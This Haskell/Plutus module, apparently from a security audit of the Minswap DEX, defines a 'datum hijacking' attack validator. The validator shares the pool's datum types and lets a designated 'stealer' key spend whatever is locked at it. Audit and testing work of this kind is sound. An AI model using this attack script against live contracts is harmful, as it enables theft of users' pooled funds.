{-# LANGUAGE DataKinds #-}
{-# LANGUAGE DeriveAnyClass #-}
{-# LANGUAGE DeriveGeneric #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE MultiParamTypeClasses #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# LANGUAGE TemplateHaskell #-}
{-# LANGUAGE TypeApplications #-}
{-# LANGUAGE TypeFamilies #-}
{-# LANGUAGE NoImplicitPrelude #-}

module Audit.Attacks.DatumHijacking where

import GHC.Generics (Generic)
import qualified Ledger
import qualified Ledger.Contexts as Contexts
import qualified Ledger.Typed.Scripts as Scripts
import qualified PlutusTx
import PlutusTx.Prelude hiding (Applicative (..))
import qualified Prelude as Haskell
import Audit.MinSwapScripts(PoolValidator)
import Minswap.ConstantProductPool.Types

datumHijackValidator :: StealerParams -> PoolDatum -> PoolRedeemer -> Contexts.ScriptContext -> Bool
datumHijackValidator (StealerParams pkh) _ _ context =
  let info = Contexts.scriptContextTxInfo context
   in elem pkh (Contexts.txInfoSignatories info)

datumHijacker :: StealerParams -> Scripts.TypedValidator PoolValidator
datumHijacker =
  Scripts.mkTypedValidatorParam @PoolValidator
    $$(PlutusTx.compile [||datumHijackValidator||])
    $$(PlutusTx.compile [||wrap||])
  where
    wrap = Scripts.wrapValidator @PoolDatum @PoolRedeemer

newtype StealerParams = StealerParams
  { stealerPKH :: Ledger.PubKeyHash
  }
  deriving stock (Haskell.Show, Generic)
PlutusTx.makeLift ''StealerParams
